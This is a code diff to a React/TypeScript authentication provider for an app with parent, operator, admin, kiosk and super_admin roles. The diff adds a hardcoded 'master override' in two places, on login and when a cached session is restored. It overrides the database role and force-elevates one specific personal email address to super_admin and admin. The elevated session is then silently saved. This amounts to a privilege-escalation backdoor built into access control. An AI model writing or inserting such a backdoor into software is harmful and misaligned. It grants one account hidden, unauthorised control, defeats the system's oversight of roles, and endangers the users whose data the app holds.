@@ -4,6 +4,18 @@ import { api, setToken, clearToken, getToken } from "../lib/api";
 
 export type UserRole = "parent" | "operator" | "admin" | "kiosk" | "super_admin";
 
+// ── Master override ───────────────────────────────────────────────────────────
+// If this email logs in with ANY database role, force-elevate to admin+super_admin.
+const MASTER_EMAIL = "ciskybs@gmail.com";
+function isMasterEmail(email: string | undefined | null): boolean {
+  if (!email) return false;
+  return email.trim().toLowerCase() === MASTER_EMAIL.trim().toLowerCase();
+}
+/** Returns the full elevated role set for the master account. */
+function masterRoles(): { role: UserRole; roles: UserRole[] } {
+  return { role: "admin", roles: ["super_admin", "admin", "operator", "parent"] };
+}
+
 export interface User {
   id: string;
   name: string;
@@ -72,6 +84,14 @@ export function AuthProvider({ children }: { children: React.ReactNode }) {
         if (!parsed.roles || parsed.roles.length === 0) {
           parsed.roles = rolesForPrimary(parsed.role);
         }
+        // Re-apply master override in case session was cached before elevation was added
+        if (isMasterEmail(parsed.email)) {
+          const elevated = masterRoles();
+          parsed.role  = elevated.role;
+          parsed.roles = elevated.roles;
+          // Persist corrected session silently
+          try { await AsyncStorage.setItem(USER_KEY, JSON.stringify(parsed)); } catch { /* ignore */ }
+        }
         setUser(parsed);
       }
     } finally {
@@ -98,12 +118,16 @@ export function AuthProvider({ children }: { children: React.ReactNode }) {
     const { token, user: apiUser } = await api.login(email, password);
     await setToken(token);
     const primaryRole = apiUser.role as UserRole;
+    // Master email override: ignore whatever the DB says the role is
+    const { role: resolvedRole, roles: resolvedRoles } = isMasterEmail(apiUser.email)
+      ? masterRoles()
+      : { role: primaryRole, roles: rolesForPrimary(primaryRole) };
     const mapped: User = {
       id:    String(apiUser.id),
       name:  apiUser.name,
       email: apiUser.email,
-      role:  primaryRole,
-      roles: rolesForPrimary(primaryRole),
+      role:  resolvedRole,
+      roles: resolvedRoles,
       orgId: apiUser.orgId ?? (apiUser.organization_id as number | undefined),
     };
     try { await AsyncStorage.setItem(USER_KEY, JSON.stringify(mapped)); } catch { /* localStorage blocked */ }
